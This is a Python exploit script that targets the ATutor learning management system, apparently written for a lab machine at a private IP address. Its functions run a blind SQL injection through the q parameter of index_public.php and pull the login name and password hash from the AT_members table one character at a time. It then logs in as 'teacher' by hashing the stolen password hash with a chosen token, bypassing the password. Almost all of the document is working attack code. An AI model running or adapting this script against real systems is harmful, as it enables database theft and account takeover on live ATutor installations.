import requests
import itertools as it
from hashlib import sha1

ip = "192.168.105.113"
path = "http://{}/ATutor/mods/_standard/social/index_public.php?q=test'".format(ip)

# [a-zA-Z0-9]
chars_test = list(it.chain(range(48, 57+1), range(65, 90+1), range(97, 122+1)))

# def get_length_of_db_name(path):
#     print("(+) Retrieving length of database name....")
#     for i in range(1, 30):
#         rq = requests.get("{}/**/or/**/length(database())={}--'".format(path, i))
#         if int(rq.headers['Content-Length']) > 20:
#             print("Database length: {}".format(i))
#             return i

# def get_name_of_db(path, length):
#     print("(+) Retrieving name of database....")
#     db_name = ""
#     for i in range(1, length + 1):
#         for j in chars_test:
#             rq = requests.get("{}/**/or/**/ascii(substring(database(),{},1))={}--'".format(path, i, j))
#             if int(rq.headers['Content-Length']) > 20:
#                 db_name += chr(j)
#     return db_name

# def get_number_of_tables(path, db_name):
#     print("(+) Retrieving number of tables....")
#     for i in chars_test:
#         rq = requests.get("{}/**/or/**/(select/**/count(*)/**/from/**/information_schema.tables/**/where/**/table_schema='{}')={}--'".format(path, db_name, i))
#         if int(rq.headers['Content-Length']) > 20:
#             return i

# number_of_columns_in_table
# name_of_columns_in_table

def get_length_of_username(path, table_name):
    print("(+) Retrieving length of username....")
    for i in range(1, 30):
        rq = requests.get("{}/**/or/**/(select/**/length(login)/**/from/**/{}/**/limit/**/1)={}--'".format(path, table_name, i))
        if int(rq.headers['Content-Length']) > 20:
            return i

def get_username(path, len_username, table_name):
    print("(+) Retrieving username....")
    username = ""
    for i in range(1, len_username + 1):
        for j in chars_test:
            rq = requests.get("{}/**/or/**/ascii(substring((select/**/login/**/from/**/{}/**/limit/**/1),{},1))={}--'".format(path, table_name, i, j))
            if int(rq.headers['Content-Length']) > 20:
                username += chr(j)
    return username

def get_length_of_password(path, table_name, username):
    print("(+) Retrieving length of password....")
    for i in range(1, 60):
        rq = requests.get("{}/**/or/**/(select/**/length(password)/**/from/**/{}/**/where/**/login='{}')={}--'".format(path, table_name, username, i))
        if int(rq.headers['Content-Length']) > 20:
            return i
def get_password(path, len_password, table_name):
    print("(+) Retrieving password....")
    password = ""
    for i in range(1, len_password + 1):
        for j in chars_test:
            rq = requests.get("{}/**/or/**/ascii(substring((select/**/password/**/from/**/{}/**/limit/**/1),{},1))={}--'".format(path, table_name, i, j))
            if int(rq.headers['Content-Length']) > 20:
                password += chr(j)
    return password

def exploit(ip, password_hashed):
    token = "miiajj"
    form_password_hidden = sha1("{}{}".format(password_hashed, token).encode()).hexdigest()
    data = {
        "form_password_hidden": form_password_hidden,
        "token": token,
        "form_login": "teacher",
        "submit": "Login"
    }
    s = requests.Session()
    res = s.post("http://{}/ATutor/login.php".format(ip), data)
    if "You have logged in successfully." in res.text:
        return True
    return False

def main():
    # len_db_name = get_length_of_db_name(path) #6
    # db_name = get_name_of_db(path, len_db_name) #atutor
    # num_of_tables = get_number_of_tables(path, db_name) #120
    table_name = 'AT_members'
    len_username = get_length_of_username(path, table_name)
    username = get_username(path, len_username, table_name)
    len_password = get_length_of_password(path, table_name, username)
    password_hashed = get_password(path, len_password, table_name)
    if exploit(ip, password_hashed):
        print("Success")
    else:
        print("Fail")
if __name__ == "__main__":
    main()


    